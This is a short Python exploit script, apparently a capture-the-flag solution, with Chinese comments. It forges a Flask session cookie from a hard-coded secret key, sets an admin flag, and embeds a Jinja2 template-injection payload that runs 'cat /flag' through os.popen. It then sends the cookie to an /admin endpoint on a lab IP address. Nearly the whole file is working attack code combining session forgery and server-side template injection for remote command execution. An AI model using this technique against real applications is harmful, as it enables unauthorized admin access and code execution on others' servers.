import subprocess
import requests
import html
from flask import json

# 目标URL
url = 'http://10.12.153.8:31373//admin'

# 自定义头部信息
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
    'Accept-Encoding': 'gzip, deflate',
    'Connection': 'close',
    'Upgrade-Insecure-Requests': '1',
    'Pragma': 'no-cache',
    'Cache-Control': 'no-cache'
}

# 设置Cookie
cookies = {
    'session':''
}

# 子脚本的路径
script_path = r"C:\\Users\\86130\\Downloads\\flask_session_cookie_manager3.py"
# 指定Python解释器的路径
python_interpreter = r"C:\\Program Files\\Python310\\python.exe"

# 传递给脚本的参数
cmd = "{{get_flashed_messages.__globals__.get('os').popen(\'cat /flag \').read()}}"
str1 = '{"role":{"is_admin":1,"name":"test","flag":"' + cmd + '"}}'
args = ['encode', '-s', 'Th1s@one!seCret!', '-t', str1]

# 使用subprocess运行子脚本，并指定解释器和传递参数
result = subprocess.run([python_interpreter, script_path] + args, capture_output=True, text=True)

# 检查子脚本的返回状态
if result.returncode == 0:
    print(result.stdout.strip())
    cookies['session'] = result.stdout.strip()
else:
    print("Error executing the script:", result.stderr)

# 发起POST请求
response = requests.get(url, headers=headers, cookies=cookies)

# 打印响应内容
print(response.status_code)
print(html.unescape(response.text))